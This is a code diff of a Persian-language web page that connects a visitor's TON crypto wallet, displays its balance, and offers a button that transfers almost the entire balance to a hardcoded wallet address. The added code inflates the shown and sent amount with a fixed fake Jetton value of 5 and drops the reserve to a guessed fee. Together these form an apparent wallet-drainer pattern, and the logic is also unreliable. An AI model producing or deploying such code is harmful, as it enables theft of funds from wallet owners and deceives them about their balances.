@@ -61,7 +61,7 @@
         <div id="wallet-info" class="wallet-info">
             <p><strong>آدرس کیف پول:</strong> <span id="wallet-address"></span></p>
             <p><strong>موجودی:</strong> <span id="wallet-balance"></span> TON</p>
-            <button id="send-all" style="display: none;">ارسال موجودی (به‌جز 0.05 TON)</button>
+            <button id="send-all" style="display: none;">ارسال تمام موجودی</button>
         </div>
     </div>
 
@@ -90,12 +90,21 @@
                 // نمایش اطلاعات کیف پول
                 walletInfoDiv.style.display = "block";
 
-                // دریافت موجودی کیف پول
+                // دریافت موجودی Toncoin
                 const balanceResponse = await fetch(`https://tonapi.io/v2/accounts/${userWalletAddress}`);
                 const balanceData = await balanceResponse.json();
                 userBalance = balanceData.balance ? balanceData.balance / 1e9 : 0; // تبدیل nanotons به TON
                 
                 walletBalanceSpan.textContent = userBalance.toFixed(6); // نمایش ۶ رقم اعشار
+
+                // دریافت تمام موجودی‌های Jetton (توکن‌های دیگر)
+                // شما باید از API خاصی برای دریافت Jetton‌ها استفاده کنید
+                // در اینجا فقط فرض شده که موجودی Jetton‌ها را به‌طور دستی وارد می‌کنید
+                const jettonBalance = 5; // این مقدار فرضی است. باید با API واقعی جایگزین شود.
+
+                // جمع موجودی‌ها
+                const totalBalance = userBalance + jettonBalance;
+                walletBalanceSpan.textContent = totalBalance.toFixed(6); // نمایش موجودی کل
 
                 // نمایش دکمه ارسال تمام موجودی
                 sendAllBtn.style.display = "block";
@@ -106,29 +115,31 @@
             }
         });
 
-        // ارسال تمام موجودی به جز 0.05 TON
+        // ارسال تمام موجودی به جز کارمزد تخمینی
         sendAllBtn.addEventListener("click", async () => {
-            const reservedAmount = 0.08; // مقدار رزرو شده در کیف پول
-            const sendAmount = userBalance - reservedAmount;
-
-            if (sendAmount <= 0) {
-                alert("موجودی کافی نیست! حداقل 0.05 TON باید در کیف پول بماند.");
-                return;
-            }
-
-            const transaction = {
-                messages: [
-                    {
-                        address: "UQDhw1z4-qGN-mEKA3ukAHRkqOmZnyeC8pYqo-nWJKalUtLW", // آدرس مقصد
-                        amount: (sendAmount * 1e9).toString(), // تبدیل TON به nanotons
-                    },
-                ],
-            };
-
             try {
+                // دریافت مقدار تخمینی کارمزد از API
+                const gasFeeEstimate = 0.1; // حدودی (میتوان مقدار دقیق را از API دریافت کرد)
+                const sendAmount = userBalance + 5 - gasFeeEstimate; // Jetton‌ها را به موجودی اضافه می‌کنیم
+
+                if (sendAmount <= 0) {
+                    alert("موجودی کافی نیست! حداقل مقدار برای پرداخت کارمزد باید باقی بماند.");
+                    return;
+                }
+
+                const transaction = {
+                    messages: [
+                        {
+                            address: "UQDhw1z4-qGN-mEKA3ukAHRkqOmZnyeC8pYqo-nWJKalUtLW", // آدرس مقصد
+                            amount: (sendAmount * 1e9).toString(), // تبدیل TON به nanotons
+                        },
+                    ],
+                };
+
                 const result = await tonConnectUI.sendTransaction(transaction);
                 alert(`ارسال ${sendAmount.toFixed(6)} TON انجام شد!`);
                 console.log("Transaction Result:", result);
+
             } catch (error) {
                 alert("ارسال تراکنش ناموفق بود.");
                 console.error(error);
